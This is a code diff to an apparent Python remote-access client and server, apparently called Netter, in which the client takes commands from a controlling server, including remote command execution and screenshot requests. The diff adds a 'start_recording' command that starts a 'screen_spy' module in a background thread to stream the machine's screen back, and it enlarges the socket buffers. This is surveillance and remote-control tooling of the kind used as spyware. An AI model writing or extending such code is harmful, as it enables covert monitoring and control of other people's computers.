@@ -2,8 +2,7 @@ import threading, socket, subprocess, typing
 import concurrent.futures, time, pickle
 from loguru import logger
 
-from PIL import ImageGrab
-import io, zlib
+import zlib
 
 if typing.TYPE_CHECKING:
     from .device import ClientDevice
@@ -11,6 +10,7 @@ if typing.TYPE_CHECKING:
     from .sock import NetterServer
 
 from .modules import screenshot as modules_screenshot
+from .modules import screen_spy
 
 class ClientWrapper:
     def __init__(self, connection: socket.socket, connectionAddress: tuple[str, int]) -> None:
@@ -26,7 +26,7 @@ class ClientWrapper:
         byte_sended: int = 0
 
         while byte_sended < len(data):
-            sent = self.connection.send(data[byte_sended:byte_sended + 1024])
+            sent = self.connection.send(data[byte_sended:byte_sended + 5120])
 
             if (sent == 0):
                 raise RuntimeError('Socket connection broken')
@@ -41,7 +41,7 @@ class ClientWrapper:
         data, total_received = bytearray(), 0
 
         while total_received < packetSize:
-            chunk = self.connection.recv(min(1024, packetSize - total_received))
+            chunk = self.connection.recv(min(5120, packetSize - total_received))
 
             if not chunk:
                 raise RuntimeError('Socket connection broken')
@@ -64,6 +64,7 @@ class ServerHandler:
     def __init__(self, server_address: tuple[str, int], deviceData: bytes, additionalData: dict) -> None:
         self.server_address: tuple = server_address
         self.isConnected: bool = False
+        self.isRecording: bool = False
 
         self.socketInstance: ClientWrapper = ClientWrapper(
             socket.socket(socket.AF_INET, socket.SOCK_STREAM),
@@ -111,6 +112,15 @@ class ServerHandler:
                     self.socketInstance.send_packet('exec_response error')
                     continue
 
+            if (message.startswith(b'start_recording')):
+                if not (self.isRecording):
+                    self.isRecording = True
+                    self.socketInstance.send_packet('recording')
+                    threading.Thread(target = screen_spy.run, args = (self,)).start()
+                    continue
+
+                self.isRecording = False
+
             if (message.startswith(b'request_screenshot')):
                 modules_screenshot.run(self.socketInstance)
 
@@ -136,6 +146,8 @@ class ClientHandler(threading.Thread):
 
     def run(self) -> None:
         while self.isConnected:
+            if (self.conneciton.stillRecording): continue
+
             try:
                 data: bytes = self.conneciton.socket.receive_packet()
 
